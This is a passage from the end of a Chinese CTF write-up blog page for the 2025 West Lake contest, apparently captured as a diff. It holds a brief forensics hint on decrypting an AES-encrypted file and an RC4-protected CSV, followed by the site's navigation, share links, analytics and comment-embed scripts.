class="line"><span class="built_in">print</span>(cipher_aes.nonce.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(tag.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
+
+<p>这是加密的脚本逆向还原就行，这里用到的key去找环境变量</p>
+<img src="/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/IMAGE20250119133056348.png" class="">
+
+<p>找到key之后还有控制台的输出直接可以写解密脚本。然后在后面的解密出来的csv中的个性签名是rc4加密密钥就是密码。</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/link/">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Rank-l"><span class="toc-number">1.1.</span> <span class="toc-text">Rank-l</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqli-or-not"><span class="toc-number">1.2.</span> <span class="toc-text">sqli or not</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%9F%E7%B3%95%E7%9A%84%E7%A3%81%E7%9B%98"><span class="toc-number">2.1.</span> <span class="toc-text">糟糕的磁盘</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ds"><span class="toc-number">3.</span> <span class="toc-text">ds</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easydatalog"><span class="toc-number">3.1.</span> <span class="toc-text">easydatalog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%96%E8%AF%81"><span class="toc-number">3.2.</span> <span class="toc-text">取证</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&text=2025西湖论剑Wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&title=2025西湖论剑Wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&is_video=false&description=2025西湖论剑Wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2025西湖论剑Wp&body=Check out this article: https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&title=2025西湖论剑Wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&title=2025西湖论剑Wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&title=2025西湖论剑Wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&title=2025西湖论剑Wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&name=2025西湖论剑Wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/01/19/CTF/WP/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91Wp/&t=2025西湖论剑Wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Oceanzbz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-QWTJSPQL4F');
+</script>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
